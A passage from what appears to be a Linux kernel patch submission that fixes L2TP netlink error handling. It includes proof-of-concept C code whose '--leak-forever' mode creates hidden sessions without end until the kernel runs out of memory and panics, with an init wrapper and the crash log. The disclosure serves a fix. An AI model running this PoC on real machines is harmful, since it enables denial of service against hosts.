	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_ID,
				 session_id);
	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_RECV_SEQ, 1=
);
	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_SEND_SEQ, 1=
);
	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_LNS_MODE, 1=
);
	if (ret < 0)
		return ret;

	nlh->nlmsg_len =3D offset;
	ret =3D nl_send(sock, req, nlh->nlmsg_len);
	if (ret < 0)
		return ret;
	return nl_wait_ack(sock, seq);
}

static int l2tp_session_delete(struct nl_socket *sock, uint16_t family_id,
			       uint32_t tunnel_id, uint32_t session_id)
{
	char req[MAX_BUF] =3D {0};
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	uint32_t seq =3D sock->seq++;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_SESSION_DELETE;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_ID,
				 session_id);
	if (ret < 0)
		return ret;

	nlh->nlmsg_len =3D offset;
	ret =3D nl_send(sock, req, nlh->nlmsg_len);
	if (ret < 0)
		return ret;
	return nl_wait_ack(sock, seq);
}

static int l2tp_tunnel_delete(struct nl_socket *sock, uint16_t family_id,
			      uint32_t tunnel_id)
{
	char req[MAX_BUF] =3D {0};
	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
	uint32_t seq =3D sock->seq++;
	int ret;

	nlh->nlmsg_len =3D offset;
	nlh->nlmsg_type =3D family_id;
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq =3D seq;

	genlh->cmd =3D L2TP_CMD_TUNNEL_DELETE;
	genlh->version =3D L2TP_GENL_VERSION;

	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel_i=
d);
	if (ret < 0)
		return ret;

	nlh->nlmsg_len =3D offset;
	ret =3D nl_send(sock, req, nlh->nlmsg_len);
	if (ret < 0)
		return ret;
	return nl_wait_ack(sock, seq);
}

static void format_ifname(char *buf, size_t buflen, uint32_t session_id)
{
	snprintf(buf, buflen, "pw%u", session_id);
}

static int observe_target_bug(bool leak_forever)
{
	struct nl_socket manager =3D { .fd =3D -1 };
	struct nl_socket blocker =3D { .fd =3D -1 };
	struct l2tp_family family;
	struct tunnel_info tunnel;
	struct session_info session;
	uint32_t created_tunnels[2048];
	uint32_t created_sessions[2048];
	size_t tunnel_count =3D 0;
	size_t session_count =3D 0;
	uint32_t base_tunnel =3D 1000 + ((uint32_t)getpid() % 100000) * 32;
	uint32_t base_peer_tunnel =3D 500000 + ((uint32_t)getpid() % 100000) * 32;
	uint32_t base_session =3D 1000000 + ((uint32_t)getpid() % 100000) * 32;
	uint16_t base_sport =3D 10000 + ((uint32_t)getpid() % 20000);
	uint16_t base_dport =3D 40000 + ((uint32_t)getpid() % 20000);
	uint32_t hidden_tunnel =3D 0;
	uint32_t hidden_session =3D 0;
	char ifname[IFNAMSIZ];
	int modify_ret;
	int ret;

	ret =3D nl_open(&manager);
	if (ret < 0)
		die_ret("nl_open(manager)", ret);
	ret =3D nl_open(&blocker);
	if (ret < 0)
		die_ret("nl_open(blocker)", ret);

	ret =3D resolve_l2tp_family(&manager, &family);
	if (ret < 0)
		die_ret("resolve_l2tp_family", ret);

	ret =3D blocker_setup(&blocker, family.mcgrp_id);
	if (ret < 0)
		die_ret("blocker_setup", ret);

	printf("[+] L2TP family_id=3D%u mcgrp_id=3D%u blocker_portid=3D%u\n",
	       family.family_id, family.mcgrp_id, blocker.portid);
	printf("[+] Using tunnel base=3D%u session base=3D%u udp base=3D%u/%u\n",
	       base_tunnel, base_session, base_sport, base_dport);
	printf("[+] Warming the subscribed blocker socket until multicast starts f=
ailing\n");

	for (uint32_t i =3D 0; i < ARRAY_SIZE(created_tunnels); i++) {
		uint32_t tunnel_id =3D base_tunnel + i;
		uint16_t sport =3D base_sport + i;
		uint16_t dport =3D base_dport + i;

		ret =3D l2tp_tunnel_create(&manager, family.family_id, tunnel_id,
					 base_peer_tunnel + i, sport, dport);
		if (ret =3D=3D -ENOBUFS) {
			hidden_tunnel =3D tunnel_id;
			printf("[+] tunnel_create returned ENOBUFS at tunnel_id=3D%u\n",
			       hidden_tunnel);
			break;
		}
		if (ret < 0)
			die_ret("l2tp_tunnel_create", ret);
		created_tunnels[tunnel_count++] =3D tunnel_id;
		if ((i + 1) % 32 =3D=3D 0)
			printf("    created %u visible tunnels so far\n", i + 1);
	}

	if (!hidden_tunnel) {
		fprintf(stderr, "[-] failed to congest the blocker socket within %zu tunn=
el creates\n",
			ARRAY_SIZE(created_tunnels));
		return 1;
	}

	ret =3D l2tp_tunnel_get(&manager, family.family_id, hidden_tunnel, &tunnel=
);
	if (ret < 0)
		die_ret("l2tp_tunnel_get(hidden_tunnel)", ret);
	printf("[+] hidden tunnel is live: tunnel_id=3D%u peer=3D%u udp=3D%u/%u\n",
	       tunnel.tunnel_id, tunnel.peer_tunnel_id,
	       tunnel.udp_sport, tunnel.udp_dport);

	printf("[+] Creating an Ethernet session on the hidden tunnel\n");
	for (uint32_t i =3D 0; i < ARRAY_SIZE(created_sessions); i++) {
		uint32_t session_id =3D base_session + i;

		format_ifname(ifname, sizeof(ifname), session_id);
		ret =3D l2tp_session_create(&manager, family.family_id, hidden_tunnel,
					  session_id, base_session + 100000 + i,
					  ifname);
		if (ret =3D=3D -ENOBUFS) {
			hidden_session =3D session_id;
			printf("[+] session_create returned ENOBUFS at session_id=3D%u ifname=3D=
%s\n",
			       hidden_session, ifname);
			break;
		}
		if (ret < 0)
			die_ret("l2tp_session_create", ret);
		created_sessions[session_count++] =3D session_id;
	}

	if (!hidden_session) {
		fprintf(stderr, "[-] failed to trigger session_create notification failur=
e\n");
		return 1;
	}

	ret =3D l2tp_session_get(&manager, family.family_id, hidden_tunnel,
			       hidden_session, &session);
	if (ret < 0)
		die_ret("l2tp_session_get(hidden_session)", ret);
	printf("[+] hidden session is live: tunnel=3D%u session=3D%u ifname=3D%s r=
ecv_seq=3D%u send_seq=3D%u lns_mode=3D%u\n",
	       session.tunnel_id, session.session_id, session.ifname,
	       session.recv_seq, session.send_seq, session.lns_mode);

	printf("[+] Modifying the hidden session\n");
	modify_ret =3D l2tp_session_modify(&manager, family.family_id, hidden_tunn=
el,
					 hidden_session);
	if (modify_ret < 0 && modify_ret !=3D -ENOBUFS)
		die_ret("l2tp_session_modify", modify_ret);
	if (modify_ret =3D=3D -ENOBUFS)
		printf("[+] session_modify returned ENOBUFS as expected\n");
	else
		printf("[!] session_modify unexpectedly returned success; continuing to v=
erify live state anyway\n");

	ret =3D l2tp_session_get(&manager, family.family_id, hidden_tunnel,
			       hidden_session, &session);
	if (ret < 0)
		die_ret("l2tp_session_get(post-modify)", ret);
	printf("[+] post-modify session state: recv_seq=3D%u send_seq=3D%u lns_mod=
e=3D%u\n",
	       session.recv_seq, session.send_seq, session.lns_mode);

	if (session.recv_seq !=3D 1 || session.send_seq !=3D 1 || session.lns_mode=
 !=3D 1) {
		fprintf(stderr, "[-] session_modify did not commit the expected live stat=
e\n");
		return 1;
	}

	if (leak_forever) {
		uint32_t session_id =3D hidden_session + 1;
		uint64_t leaked =3D 1;

		printf("[+] Entering leak loop on hidden tunnel %u; kill the process or w=
ait for OOM/panic\n",
		       hidden_tunnel);
		fflush(stdout);

		for (;; session_id++) {
			format_ifname(ifname, sizeof(ifname), session_id);
			ret =3D l2tp_session_create(&manager, family.family_id, hidden_tunnel,
						  session_id, session_id + 40000,
						  ifname);
			if (ret !=3D 0 && ret !=3D -ENOBUFS)
				die_ret("leak l2tp_session_create", ret);

			leaked++;
			if ((leaked % 256) =3D=3D 0) {
				printf("[+] leaked %" PRIu64 " hidden Ethernet sessions so far\n",
				       leaked);
				fflush(stdout);
			}
		}
	}

	if (!leak_forever) {
		printf("[+] Closing blocker and cleaning up leaked objects\n");
		nl_close(&blocker);
		(void)l2tp_session_delete(&manager, family.family_id, hidden_tunnel,
					  hidden_session);
		for (size_t i =3D 0; i < session_count; i++)
			(void)l2tp_session_delete(&manager, family.family_id,
						  hidden_tunnel, created_sessions[i]);
		(void)l2tp_tunnel_delete(&manager, family.family_id, hidden_tunnel);
		for (size_t i =3D 0; i < tunnel_count; i++)
			(void)l2tp_tunnel_delete(&manager, family.family_id,
						  created_tunnels[i]);
	}

	printf("[+] Observed the target paths:\n");
	printf("    tunnel_create returned ENOBUFS after publishing tunnel %u\n",
	       hidden_tunnel);
	printf("    session_create returned ENOBUFS after publishing session %u\n",
	       hidden_session);
	printf("    session_modify returned %s after committing recv_seq/send_seq/=
lns_mode=3D1\n",
	       modify_ret =3D=3D -ENOBUFS ? "ENOBUFS" : "success");

	nl_close(&manager);
	nl_close(&blocker);
	return 0;
}

int main(int argc, char **argv)
{
	bool leak_forever =3D false;

	if (argc > 2) {
		fprintf(stderr, "usage: %s [--leak-forever]\n", argv[0]);
		return EXIT_FAILURE;
	}
	if (argc =3D=3D 2) {
		if (strcmp(argv[1], "--leak-forever") !=3D 0) {
			fprintf(stderr, "unknown option: %s\n", argv[1]);
			return EXIT_FAILURE;
		}
		leak_forever =3D true;
	}

	return observe_target_bug(leak_forever);
}
------END poc.c--------

The finite run exits after observing the committed states. The crash log us=
es
the `--leak-forever` branch shown at the end of `poc.c`.

------BEGIN init-original.c------
#define _GNU_SOURCE
#include <errno.h>
#include <linux/reboot.h>
#include <fcntl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/socket.h>
#include <unistd.h>

static void bring_lo_up(void)
{
    struct ifreq ifr;
    int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return;
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
    if (ioctl(fd, SIOCGIFFLAGS, &ifr) =3D=3D 0) {
        ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
        (void)ioctl(fd, SIOCSIFFLAGS, &ifr);
    }
    close(fd);
}

int main(void)
{
    char *const args[] =3D { (char *)"/poc-original", (char *)"--leak-forev=
er", NULL };
    char *const envp[] =3D { (char *)"PATH=3D/", NULL };
    int fd;
    const char value[] =3D "2\n";

    mount("proc", "/proc", "proc", 0, NULL);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    fd =3D open("/proc/sys/vm/panic_on_oom", O_WRONLY);
    if (fd >=3D 0) {
        (void)write(fd, value, sizeof(value) - 1);
        close(fd);
    }
    bring_lo_up();
    fprintf(stdout, "[init] launching original PoC leak run\n");
    fflush(stdout);
    execve(args[0], args, envp);
    fprintf(stderr, "[init] execve failed: %d (%s)\n", errno, strerror(errn=
o));
    return 127;
}
------END init-original.c--------

The crash log below is from the `/poc-original --leak-forever` run
launched by the initramfs `/init` shown above. That init wrote `2\n` to
`/proc/sys/vm/panic_on_oom` before execve, and the OOM path panicked as sho=
wn
below.

It is decoded output from the vulnerable 7.2.0-rc7+ #1 run, using the vmlin=
ux
built from the same unpatched source tree and image.

----BEGIN crash log----
[   43.407115] Kernel panic - not syncing: Out of memory: compulsory panic_=
on_oom is enabled
[   43.407786] CPU: 1 UID: 0 PID: 1 Comm: poc-original Not tainted 7.2.0-rc=
7+ #1 PREEMPT(lazy)
[   43.407786] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_=
caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   43.407786] Call Trace:
[   43.407786]  <TASK>
[   43.407786]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   43.407786]  dump_stack (lib/dump_stack.c:129)
[   43.407786]  vpanic (kernel/panic.c:651)
[   43.407786]  panic (kernel/panic.c:788)
[   43.407786]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_=
kill.c:1143 (discriminator 4))
[   43.407786]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4116 mm/page_a=
lloc.c:4967 mm/page_alloc.c:5317)
[   43.407786]  allocate_slab (mm/slub.c:3266 (discriminator 2) mm/slub.c:3=
388 (discriminator 2))
[   43.407786]  new_slab (mm/slub.c:3426)
[   43.407786]  refill_objects (mm/slub.c:7310)
[   43.407786]  __pcs_replace_empty_main (mm/slub.c:2804 mm/slub.c:4675)
[   43.407786]  kmem_cache_alloc_noprof (mm/slub.c:4773 mm/slub.c:4905 mm/s=
lub.c:4931)
[   43.407786]  ? __kernfs_new_node (fs/kernfs/dir.c:665 (discriminator 2))
[   43.407786]  __kernfs_new_node (fs/kernfs/dir.c:665 (discriminator 2))
[   43.407786]  ? idr_alloc_cyclic (lib/idr.c:127)
[   43.407786]  kernfs_new_node (fs/kernfs/dir.c:751 (discriminator 1))
[   43.407786]  __kernfs_create_file (fs/kernfs/file.c:1050)
[   43.407786]  sysfs_add_file_mode_ns (fs/sysfs/file.c:316)
[   43.407786]  ? device_get_ownership (drivers/base/core.c:2658)
[   43.407786]  internal_create_group (fs/sysfs/group.c:82 fs/sysfs/group.c=
:189)
[   43.407786]  ? kernfs_add_one (fs/kernfs/dir.c:868)
[   43.407786]  internal_create_groups (fs/sysfs/group.c:229)
[   43.407786]  sysfs_create_groups (fs/sysfs/group.c:255)
[   43.407786]  device_add (drivers/base/core.c:2907 drivers/base/core.c:29=
71 drivers/base/core.c:3711)
[   43.407786]  ? dev_set_name (drivers/base/core.c:3560)
[   43.407786]  netdev_register_kobject (net/core/net-sysfs.c:2340)
[   43.407786]  ? raw_notifier_call_chain (kernel/notifier.c:453)
[   43.407786]  register_netdevice (net/core/dev.c:11450)
[   43.407786]  l2tp_eth_create (net/l2tp/l2tp_eth.c:289)
[   43.407786]  l2tp_nl_cmd_session_create (net/l2tp/l2tp_netlink.c:639 (di=
scriminator 1))
[   43.407786]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)
[   43.407786]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/gene=
tlink.c:1209)
[   43.407786]  ? __pfx_l2tp_nl_cmd_session_create (net/l2tp/l2tp_netlink.c=
:141)
[   43.407786]  ? __pfx_genl_rcv_msg (net/netlink/genetlink.c:1079)
[   43.407786]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   43.407786]  genl_rcv (net/netlink/genetlink.c:1218)
[   43.407786]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/=
af_netlink.c:1345)
[   43.407786]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   43.407786]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/soc=
ket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))
[   43.407786]  ___sys_sendmsg (net/socket.c:2738)
[   43.407786]  __sys_sendmsg (net/socket.c:2770)
[   43.407786]  __x64_sys_sendmsg (net/socket.c:2775 net/socket.c:2773 net/=
socket.c:2773)
[   43.407786]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:=
47)
[   43.407786]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entr=
y/syscall_64.c:94)
[   43.407786]  ? __x64_sys_recvfrom (net/socket.c:2317 net/socket.c:2313 n=
et/socket.c:2313)
[   43.407786]  ? x64_sys_call (arch/x86/include/generated/asm/syscalls_64.=
h:46)
[   43.407786]  ? do_syscall_64 (arch/x86/include/asm/entry-common.h:63 inc=
lude/linux/irq-entry-common.h:210 include/linux/irq-entry-common.h:230 incl=
ude/linux/entry-common.h:318 arch/x86/entry/syscall_64.c:100)
[   43.407786]  ? __x64_sys_sendmsg (net/socket.c:2775 net/socket.c:2773 ne=
t/socket.c:2773)
[   43.407786]  ? x64_sys_call (arch/x86/include/generated/asm/syscalls_64.=
h:47)
[   43.407786]  ? do_syscall_64 (arch/x86/include/asm/entry-common.h:63 inc=
lude/linux/irq-entry-common.h:210 include/linux/irq-entry-common.h:230 incl=
ude/linux/entry-common.h:318 arch/x86/entry/syscall_64.c:100)
[   43.407786]  ? do_syscall_64 (include/linux/randomize_kstack.h:57 arch/x=
86/entry/syscall_64.c:92)
[   43.407786]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:1=
21)
[   43.407786] RIP: 0033:0x41ff64
[   43.407786] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb =
b5 0f 1f 00 f3 0f 1e fa 80 3d fd e0 08 00 00 74 13 b8 2e 00 00 00 0f 05 <48=
> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
All code
=3D=3D=3D=3D=3D=3D=3D=3D
   0:	c2 c0 ff             	ret    $0xffc0
   3:	ff                   	(bad)
   4:	ff f7                	push   %rdi
   6:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
   a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  11:	eb b5                	jmp    0xffffffffffffffc8
  13:	0f 1f 00             	nopl   (%rax)
  16:	f3 0f 1e fa          	endbr64
  1a:	80 3d fd e0 08 00 00 	cmpb   $0x0,0x8e0fd(%rip)        # 0x8e11e
  21:	74 13                	je     0x36
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping =
instruction
  30:	77 4c                	ja     0x7e
  32:	c3                   	ret
  33:	0f 1f 00             	nopl   (%rax)
  36:	55                   	push   %rbp
  37:	48 89 e5             	mov    %rsp,%rbp
  3a:	48 83 ec 20          	sub    $0x20,%rsp
  3e:	89                   	.byte 0x89
  3f:	55                   	push   %rbp

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 4c                	ja     0x54
   8:	c3                   	ret
   9:	0f 1f 00             	nopl   (%rax)
   c:	55                   	push   %rbp
   d:	48 89 e5             	mov    %rsp,%rbp
  10:	48 83 ec 20          	sub    $0x20,%rsp
  14:	89                   	.byte 0x89
  15:	55                   	push   %rbp
[   43.407786] RSP: 002b:00007ffdeb4d6a98 EFLAGS: 00000202 ORIG_RAX: 000000=
000000002e
[   43.407786] RAX: ffffffffffffffda RBX: 00007ffdeb4dabf8 RCX: 00000000004=
1ff64
[   43.407786] RDX: 0000000000000000 RSI: 00007ffdeb4d6ac0 RDI: 00000000000=
00003
[   43.407786] RBP: 00007ffdeb4d6b30 R08: 00007ffdeb4dec40 R09: 00000000000=
0000a
[   43.407786] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffdeb4=
dec40
[   43.407786] R13: 000000000000a4c3 R14: 00007ffdeb4d6b28 R15: 00007ffdeb4=
d6b20
[   43.407786]  </TASK>
[   43.407786] Kernel Offset: 0x35e00000 from 0xffffffff81000000 (relocatio=
n range: 0xffffffff80000000-0xffffffffbfffffff)
[   43.407786] ---[ end Kernel panic - not syncing: Out of memory: compulso=
ry panic_on_oom is enabled ]---
-----END crash log-----

Best regards,
Zihan Xi

changes in v2:
  - Extend the fix to l2tp_nl_cmd_tunnel_modify().
  - Remove explicit (void) casts and match existing bare-call style.
  - Add the observed unpatched ENOBUFS transcript and clarify the scope.
  - v1 Link: https://lore.kernel.org/all/cover.1786962220.git.zihanx@nebuse=
c.ai/=0D
=0D
Zihan Xi (1):
  net: l2tp: do not propagate multicast notification errors

 net/l2tp/l2tp_netlink.c | 16 ++++++++--------
 1 file changed, 8 insertions(+), 8 deletions(-)

--=20
2.43.0

